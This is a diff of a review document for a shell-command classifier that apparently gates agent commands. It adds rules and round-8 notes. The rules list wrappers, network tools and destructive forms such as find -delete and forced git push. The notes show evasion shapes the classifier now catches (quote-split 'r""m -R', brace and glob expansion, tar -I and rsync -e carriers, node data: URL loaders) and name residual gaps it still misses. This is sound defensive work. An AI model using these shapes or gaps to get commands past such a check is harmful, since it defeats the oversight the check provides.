@@ -513,29 +513,36 @@ board note 9, 2026-10-21). The host bug is a separate card, T-143 (board note 9:
 
 <!-- classifier-rules:begin -->
 - unclassified: a first word with = (NAME=value); the programs ., alias, at, batch, builtin, busybox, call, cgexec, chronic, chroot, chrt, command, dbus-run-session, declare, doas, env, eval, exec, expect, export, fakeroot, firejail, flock, gdb, ionice, lldb, ltrace, newgrp, nice, nohup, nsenter, parallel, pkexec, proxychains, proxychains4, runas, runuser, screen, script, set, setarch, setsid, sg, socat, source, start, stdbuf, strace, su, sudo, systemd-run, taskset, time, timeout, tmux, torsocks, trap, typeset, unbuffer, unshare, watch, wsl, xargs
-- find with -exec, -execdir, -ok or -okdir
+- find: -delete is destructive; -exec, -execdir, -ok or -okdir running rm is destructive; any other program after one of them is unclassified
 - a first word, or a shell or interpreter argument, with an unquoted {, }, *, ? or [
+- a program not in the tables, given an argument with an unquoted {, }, *, ? or [ that may expand to one of the command words below (braces expanded, the glob matched by name)
 - a shell operator outside quotes: | ; & < > ` ( ) ! and $( , or a newline or a carriage return; a $ or a backtick anywhere
 - git: -C, --git-dir, --work-tree, --namespace and --super-prefix are skipped with their value; -c, --config-env, and any other global option not in the tables, make the call unclassified
 - a program not in the tables, given an argument that after a directory, a quote, leading dashes or = is one of: base64, brew, busybox, caffeinate, cargo, cat, cgexec, chmod, choco, chronic, chroot, chrt, cp, curl, dbus-run-session, diff, dir, doas, docker, echo, env, expect, fakeroot, file, find, firejail, flock, gdb, gem, gh, git, go, grep, gtimeout, head, helm, hyperfine, ionice, kubectl, less, lldb, ln, ls, ltrace, make, man, mkdir, more, mv, newgrp, nice, nohup, npm, npx, nsenter, numactl, parallel, pip, pip3, pkexec, pnpm, podman, prlimit, proxychains, proxychains4, pwd, rg, rm, rmdir, rsync, runas, runcon, runuser, scp, setarch, setpriv, setsid, sftp, sg, socat, sort, ssh, stat, stdbuf, strace, su, sudo, systemd-run, tail, tar, taskset, terraform, timeout, tmux, torsocks, touch, tree, type, unbuffer, unshare, uv, vercel, wc, wget, which, winget, wsl, xargs, yarn, or a family name (below)
 - an option, or a key=value word, whose name is pre, pre-glob, or contains command, exec, pager, editor, shell, eval, hook, helper or program: for any program but git
+- carrier options, held whatever the value names: tar -I (and its cluster letter I), rsync -e (letter e) and --rsh, scp -S (letter S)
 - less, more, most, pg: an argument starting with + or containing !; man: an argument starting with -P
 - a program name is normalised first: a directory, quotes, .exe, .cmd, .bat, .com, .ps1 and a version suffix (python3.11, perl5.36) are dropped
 - families (closed): shell: ash, bash, csh, dash, elvish, fish, ksh, mksh, nu, rbash, sash, sh, tcsh, xonsh, zsh; pwsh: pwsh, powershell; cmd; python: py, pypy, python, pythonw, pyw; node: node, nodejs; perl; ruby; php; sed: sed, gsed; code: any name ending awk, and bun, deno, emacs, ex, expect, groovy, gvim, jshell, julia, lua, luajit, nvim, osascript, rscript, rvim, tclsh, vi, view, vim, vimdiff, wish (code is always unclassified)
 - anywhere in the arguments: -c, -e or /c as whole words
 - shell family: a single-dash word anywhere in the arguments holding one of cCeE (a glued value counts); --command
 - python family: a single-dash word holding c; node family: holding e or p; --eval, --print; perl: e or E; ruby: e; php: r, R or B
+- node family: --import, --loader or --experimental-loader with a data: URL in the arguments
 - sed: an e command (1e rm) or an s///e flag
 - cmd: an argument with /c, /k, /r anywhere, in any case
 - powershell, pwsh: an argument whose first letter is c or e (a glued value counts: -cRemove-Item), except -ExecutionPolicy and -ConfigurationName in full; the dash may be a hyphen, an en dash, an em dash or a horizontal bar
-- git: rebase with -x or --exec; config with a key containing alias, pager, editor, command, helper, hook, external, textconv, fsmonitor, askpass, program: unclassified
+- git: rebase with -x or --exec; config with a key containing alias, pager, editor, command, helper, hook, external, textconv, fsmonitor, askpass, program, clean, smudge, process, driver, gitproxy: unclassified
+- git push: destructive with --force, --force-with-lease, --delete, --mirror, a single-dash word holding f or d (-fu), or a + before a ref
 - send flags (external_comm, not web): the names -d, -F, -T, --data, --data-raw, --data-binary, --data-urlencode, --data-ascii, --upload-file, --form, --form-string, --json, --post-data, --post-file, --body-data, --body-file; a long flag starting with --data, --form, --post- or --body-; a short -d, -F or -T, attached or not; -X or --request with a method other than GET (as the next word, attached, or with =)
 <!-- classifier-rules:end -->
 
-  **Every move against f483f87** (review round 7; `py tools/p21_classifier_moves.py f483f87` prints
-  these counts). 327,986 generated shapes (programs x pre-options x payload forms x tails, a newline
-  after each program, the curl and wget send forms, git global options, plain commands, and the
-  round-7 families and wrappers): 235,702 moved, 0 held-to-allowed. Every move goes to unclassified,
+  **Every move against f483f87** (review round 7, regenerated in round 8; `py tools/p21_classifier_moves.py
+  f483f87` prints these counts). 327,986 generated shapes (programs x pre-options x payload forms x tails, a
+  newline after each program, the curl and wget send forms, git global options, plain commands, and the
+  round-7 families and wrappers): 235,902 moved, 0 held-to-allowed. Round 8 adds 2 find shapes from write_repo
+  to destructive (`find -delete`) and 56 find shapes from read to unclassified (a -exec, -execdir, -ok or
+  -okdir of a program other than rm). The round-8 wrapper, carrier, node, git config and force-push moves
+  are in the total but not in the group counts below, which are the round-7 counts. Every move goes to unclassified,
   to external_comm, or to a class policy judges more strictly (`destructive`, `git_push`, `write_repo`):
   6 shapes exec to destructive (`git -C . reset --hard`), 6 to git_push/destructive (`git -C . push
   --force`), and 6 to write_repo (`git -C . add`: the directory was read as the subcommand before, so the
@@ -667,12 +674,28 @@ board note 9, 2026-10-21). The host bug is a separate card, T-143 (board note 9:
   slash, an en dash (U+2013), an em dash (U+2014) or a horizontal bar (U+2015) (`_SWITCH_DASHES`). (7)
   git: rebase with -x or --exec, and config with a key that names a command git runs later (alias,
   pager, editor, command, helper, hook, external, textconv, fsmonitor, askpass, program), are
-  unclassified. find -delete stays write_repo (the owner's answer). (8) scp, rsync and ssh: a family
-  name among their words is unclassified (`scp -S`, `rsync -e`, `ssh -o`). (9) Argument-carried
-  commands (the owner's answer S5, yes): `tar --to-command`, `tar -I`, `tar --use-compress-program`,
-  `sort --compress-program`, `rsync --rsh`, `ssh -o ProxyCommand`, `scp -S` are held by the rules above;
-  a program named by an option value that is in no family or table runs as a plain exec, as any program
-  does (residual, below).
+  unclassified. find -delete is destructive, and find -exec, -execdir, -ok or -okdir running rm is
+  destructive (the owner's answer, round 8); any other program after one of them is unclassified. (8)
+  scp, rsync and ssh: a family name among their words is unclassified (`scp -S`, `rsync -e`, `ssh -o`).
+  (9) Argument-carried commands (the owner's answer S5, yes): `tar --to-command`, `tar -I`,
+  `tar --use-compress-program`, `sort --compress-program`, `rsync --rsh`, `ssh -o ProxyCommand`, `scp -S`
+  are held. The carrier options `tar -I`, `rsync -e` and `--rsh`, `scp -S` are held whatever the value
+  names (round 8, `_CARRIERS`). A program named by any other option value that is in no family or table
+  runs as a plain exec, as any program does (residual, below).
+- Round 8 (review of 64d5bd9, T-128). (1) find: see round 7, item (7). (2) A wrapper's words are read as argv gives
+  them, quotes removed (`gtimeout 5 r""m -R build`, `docker run alpine r""m -R /w`), and a brace or glob
+  word that may expand to a command word is held (`gtimeout 5 {rm,-R,build}`, `gtimeout 5 r? -R build`,
+  `docker run alpine {sh,-c,x}`): braces expand one level, and a glob matches the command names by its
+  pattern (`tests/*.py` stays plain, `tests/*` is held: an over-hold). (3) `rg --pr""e` is read as
+  `--pre`: the option rule reads argv too. (4) The carriers of (9). (5) `node --import`, `--loader` and
+  `--experimental-loader` with a data: URL is held (the module text is in argv); a module file named by
+  these flags, and `node -r`, stay a plain exec (residual, below). (6) git config keys for a filter
+  (clean, smudge, process), a merge driver (driver) and core.gitProxy are unclassified. (7) git push is
+  destructive with a single-dash word holding f or d (`-fu`), or a `+` before a ref (`+main`), as with
+  --force. Owner questions for this round: whether `tar -I` and the other carriers should hold every value
+  (as built) or only a value that names a program outside the tables; and whether the store-pin scan
+  (test_repo_store) should stay as it is, with the `--git-dir` literal in canonical.py built from parts,
+  or take a reviewed exemption for the classifier.
   The invariant is property-tested (E20): for every launcher of the table, and for thirty invented
   program names, in front of each command of a corpus, the result is unclassified, or the same class as
   the command alone. An unknown program with no command argument stays a plain exec (E19): holding every
@@ -681,6 +704,10 @@ board note 9, 2026-10-21). The host bug is a separate card, T-143 (board note 9:
   `make -f evil.mk`, `npm run <script>` (the script body), `npx <package>` and `pnpm dlx <package>`
   (the package's code), `pwsh -` and `python -` reading stdin, `sed -f script.sed`, `python -m <module>`
   (the module's code), and any file a program reads for its own code.
+- Residual, round 8: a host label of letters only (`curl https://hunterpassword.example/x` shows
+  `hunterpassword.example`; the token-like rule needs a digit, owner call). An option value that names a
+  program outside the tables and is not a carrier (`zip -TT mytool`, `fzf --preview mytool`) is a plain exec.
+  `git push -fu` and `+refspec` were not destructive before round 8 and are now (see (7)).
 - Decoy row (review of 025c812, R6; no code change). The E03 expectation row is test_p21_activity.py
   line 120, `curl --proxy-header http://decoy.example https://h.example/x`, expecting ('web', 'curl').
   The planted-secret HOSTILE row that replaced the original decoy HOSTILE row is line 221,
